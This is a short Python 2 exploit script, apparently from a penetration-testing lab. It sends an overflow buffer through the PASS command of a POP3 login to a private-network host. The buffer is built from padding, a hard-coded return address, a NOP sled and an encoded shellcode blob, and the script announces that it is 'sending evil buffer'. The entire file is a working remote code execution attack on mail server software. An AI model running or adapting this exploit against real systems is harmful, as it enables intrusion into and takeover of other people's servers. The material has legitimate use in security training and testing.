#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
shell = (
"\xdb\xdd\xbb\xb4\x28\x16\x6e\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x58\x17\x03\x58\x17\x83\x74\x2c\xf4\x9b\x88\xc5\x7a"
"\x63\x70\x16\x1b\xed\x95\x27\x1b\x89\xde\x18\xab\xd9\xb2\x94"
"\x40\x8f\x26\x2e\x24\x18\x49\x87\x83\x7e\x64\x18\xbf\x43\xe7"
"\x9a\xc2\x97\xc7\xa3\x0c\xea\x06\xe3\x71\x07\x5a\xbc\xfe\xba"
"\x4a\xc9\x4b\x07\xe1\x81\x5a\x0f\x16\x51\x5c\x3e\x89\xe9\x07"
"\xe0\x28\x3d\x3c\xa9\x32\x22\x79\x63\xc9\x90\xf5\x72\x1b\xe9"
"\xf6\xd9\x62\xc5\x04\x23\xa3\xe2\xf6\x56\xdd\x10\x8a\x60\x1a"
"\x6a\x50\xe4\xb8\xcc\x13\x5e\x64\xec\xf0\x39\xef\xe2\xbd\x4e"
"\xb7\xe6\x40\x82\xcc\x13\xc8\x25\x02\x92\x8a\x01\x86\xfe\x49"
"\x2b\x9f\x5a\x3f\x54\xff\x04\xe0\xf0\x74\xa8\xf5\x88\xd7\xa5"
"\x3a\xa1\xe7\x35\x55\xb2\x94\x07\xfa\x68\x32\x24\x73\xb7\xc5"
"\x4b\xae\x0f\x59\xb2\x51\x70\x70\x71\x05\x20\xea\x50\x26\xab"
"\xea\x5d\xf3\x7c\xba\xf1\xac\x3c\x6a\xb2\x1c\xd5\x60\x3d\x42"
"\xc5\x8b\x97\xeb\x6c\x76\x70\x1e\x7a\x78\xb9\x76\x7e\x78\xb8"
"\x3d\xf7\x9e\xd0\x51\x5e\x09\x4d\xcb\xfb\xc1\xec\x14\xd6\xac"
"\x2f\x9e\xd5\x51\xe1\x57\x93\x41\x96\x97\xee\x3b\x31\xa7\xc4"
"\x53\xdd\x3a\x83\xa3\xa8\x26\x1c\xf4\xfd\x99\x55\x90\x13\x83"
"\xcf\x86\xe9\x55\x37\x02\x36\xa6\xb6\x8b\xbb\x92\x9c\x9b\x05"
"\x1a\x99\xcf\xd9\x4d\x77\xb9\x9f\x27\x39\x13\x76\x9b\x93\xf3"
"\x0f\xd7\x23\x85\x0f\x32\xd2\x69\xa1\xeb\xa3\x96\x0e\x7c\x24"
"\xef\x72\x1c\xcb\x3a\x37\x3c\x2e\xee\x42\xd5\xf7\x7b\xef\xb8"
"\x07\x56\x2c\xc5\x8b\x52\xcd\x32\x93\x17\xc8\x7f\x13\xc4\xa0"
"\x10\xf6\xea\x17\x10\xd3")
buffer = 'A' * 2606 + '\x8F\x35\x4a\x5f' + "\x90" * 16 + shell + 'C' * (3500-2606-4-351-16)
try:
  print "\nSending evil buffer..." 
  s.connect(('10.11.10.125',110)) 
  data = s.recv(1024)
  s.send('USER username' +'\r\n') 
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!." 
except:
  print "Could not connect to POP3!"
